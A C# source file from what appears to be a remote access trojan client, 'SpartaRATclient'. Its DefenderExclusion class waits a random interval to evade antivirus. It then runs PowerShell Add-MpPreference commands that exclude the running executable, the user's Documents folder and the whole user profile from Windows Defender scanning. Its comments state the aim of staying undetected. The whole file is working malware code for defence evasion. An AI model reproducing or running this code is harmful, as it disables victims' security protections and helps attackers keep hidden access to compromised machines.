using Microsoft.Win32;
using SpartaRATclient.Tools;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace SpartaRATclient
{
    public class DefenderExclusion
    {
        //Windows defender bypass
        public void Exclude()
        {
            //Long sleeps help bypassing AV
            Random _ = new Random();
            Thread.Sleep(_.Next(30_000, 60_000));

            RegistryData key = new RegistryData();
            if (!key.CheckIfRegistryDataExist("DefenderBypassed"))
            {
                Powershell PowershellCommand = new Powershell();
                //Defender execlude bypass. "-AttackSurfaceReductionOnlyExclusions" is not risky as "-ExclusionPath" so it first to be runned
                PowershellCommand.Run("Add-MpPreference -AttackSurfaceReductionOnlyExclusions \"C:\\Users\\" + Environment.UserName + "\\Documents\"" +
                        " && Add-MpPreference -AttackSurfaceReductionOnlyExclusions " + Assembly.GetExecutingAssembly().Location + " && Add-MpPreference -ExclusionIpAddress " + "0.0.0.0");
                //Doing this to make 1000% sure that windows defender will not detect me
                //HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\
                PowershellCommand.Run("Add-MpPreference -ExclusionPath C:\\Users\\" + Environment.UserName);
                key.CreateRegistryData("DefenderBypassed", "0");
            }
        }
    }
}